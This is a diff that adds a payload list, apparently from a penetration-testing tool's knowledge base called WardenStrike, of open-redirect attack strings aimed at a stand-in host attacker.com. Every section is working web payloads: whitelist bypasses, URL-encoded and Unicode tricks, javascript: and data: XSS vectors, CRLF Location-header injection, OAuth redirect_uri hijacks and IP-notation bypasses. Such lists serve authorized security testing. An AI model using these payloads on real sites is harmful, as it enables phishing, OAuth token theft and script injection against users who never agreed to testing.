@@ -1,0 +1,66 @@
+# Open Redirect Payloads
+# WardenStrike Knowledge Base
+
+# ─── Basic ───────────────────────────────────────────────────────
+https://attacker.com
+http://attacker.com
+//attacker.com
+///attacker.com
+////attacker.com
+/\attacker.com
+\\attacker.com
+
+# ─── Bypass whitelist ────────────────────────────────────────────
+https://attacker.com@legitimate.com
+https://legitimate.com@attacker.com
+https://attacker.com?legitimate.com
+https://attacker.com#legitimate.com
+https://legitimate.com.attacker.com
+https://legitimateattacker.com
+
+# ─── URL encoding ────────────────────────────────────────────────
+%2F%2Fattacker.com
+%2F%5Cattacker.com
+%2F%2F%2Fattacker.com
+%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d
+%252f%252fattacker.com  (double encoded)
+https%3A%2F%2Fattacker.com
+https%3A//attacker.com
+
+# ─── Protocol bypass ─────────────────────────────────────────────
+javascript:alert(1)  (XSS via redirect)
+javascript://comment%0aalert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
+
+# ─── CRLF injection ──────────────────────────────────────────────
+https://legitimate.com%0d%0aLocation:%20https://attacker.com
+https://legitimate.com%0aLocation:%20https://attacker.com
+%0d%0aLocation:%20https://attacker.com
+
+# ─── Parameter-specific bypasses ────────────────────────────────
+# When validation checks prefix:
+https://legitimate.com/../../../https://attacker.com
+https://legitimate.com/legitimate.com/../https://attacker.com
+
+# ─── OAuth/SSO specific ──────────────────────────────────────────
+redirect_uri=https://attacker.com
+redirect_uri=https://attacker.com@legitimate.com/callback
+redirect_uri=https://legitimate.com.attacker.com/callback
+redirect_uri=https://attacker.com/callback?url=https://legitimate.com
+callback=https://attacker.com
+next=https://attacker.com
+return_to=https://attacker.com
+return_url=https://attacker.com
+goto=https://attacker.com
+destination=https://attacker.com
+
+# ─── Whitelisted domain bypass ───────────────────────────────────
+https://legitimate.com%E3%80%82attacker.com  (Unicode full stop)
+https://legitimate꣄attacker.com  (Unicode trick)
+https://legitimate.com%09%09%09%09%09attacker.com
+# IP notation bypass
+https://2130706433  (127.0.0.1 as decimal)
+https://0x7f000001  (127.0.0.1 as hex)
+https://017700000001  (127.0.0.1 as octal)
